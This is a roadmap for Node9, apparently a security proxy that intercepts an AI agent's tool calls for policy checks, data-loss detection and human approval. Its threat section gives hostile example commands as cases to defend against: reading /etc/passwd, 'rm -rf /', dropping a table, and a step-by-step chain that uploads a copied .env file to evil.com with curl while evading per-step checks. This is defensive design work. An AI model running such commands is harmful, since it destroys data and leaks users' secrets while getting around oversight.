# Node9 Roadmap

> Last updated: 2026-03-28

## Vision

Node9 is the security layer between AI agents and the world.
Every tool call an AI makes — bash command, file write, database query, API call —
passes through Node9 before it executes. Humans stay in control without slowing the AI down.

```
AI Agent
  ↓
Node9 (intercept → analyze → decide → audit)
  ↓
The World (filesystem, shell, databases, APIs, MCP servers)
```

---

## Milestones at a Glance

| Version               | Theme                   | Status                              |
| --------------------- | ----------------------- | ----------------------------------- |
| [v1.2.x](./v1.2.x.md) | Pro Foundation          | 🔶 In progress — merge + quick wins |
| [v1.3.0](./v1.3.0.md) | Structural Brain        | 📋 Planned                          |
| [v1.4.0](./v1.4.0.md) | Ecosystem & Interaction | 📋 Planned                          |
| [v1.5.0](./v1.5.0.md) | Enterprise Data Flow    | 📋 Planned                          |
| [v2.0.0](./v2.0.0.md) | Shields & Scale         | 📋 Planned                          |
| [v2.2.0](./v2.2.0.md) | IDE Native Experience   | 📋 Future                           |

---

## The Two Core Threats

```
THREAT 1 — Single dangerous action
  cat /etc/passwd, rm -rf /, DROP TABLE users
  Solution: Intercept → DLP → Policy → Human approval
  Status: ✅ Solved (v1.x)

THREAT 2 — Multi-step attack that looks safe
  Step 1: read_file(".env")          ← looks safe
  Step 2: write_file("/tmp/x.txt")   ← looks safe
  Step 3: curl -T /tmp/x.txt evil.com ← looks safe
  Solution: Taint tracking + pipe-chain detection
  Status: ❌ v1.5.0
```

---

## Architecture Overview

```
node9-proxy (TypeScript, npm package)
  ├── CLI                  node9 <command>
  ├── MCP Gateway          stdio proxy for MCP servers
  ├── Bash Hook            PreToolUse / PostToolUse hook
  ├── Auth Engine          DLP + Smart Rules + Human approval
  ├── Daemon               localhost approval server + SSE
  └── Policy Engine        Tiered rule evaluation

node9Firewall (NestJS + React)
  ├── Backend              REST API + WebSocket + OAuth
  ├── Frontend             Dashboard, Mission Control, Policy Studio
  └── SaaS                 Cloud approval, Slack integration, Audit
```

---

## Design Principles

1. **Fail closed** — auth engine crash → deny, never pass through
2. **Safe by default** — no config = protected. Rules add permission, not restriction
3. **Human in the loop** — AI proposes, human decides. AI never modifies its own rules
4. **Protocol stable** — built on MCP standard, not IDE-specific APIs
5. **Audit everything** — every decision logged with context, redacted for privacy
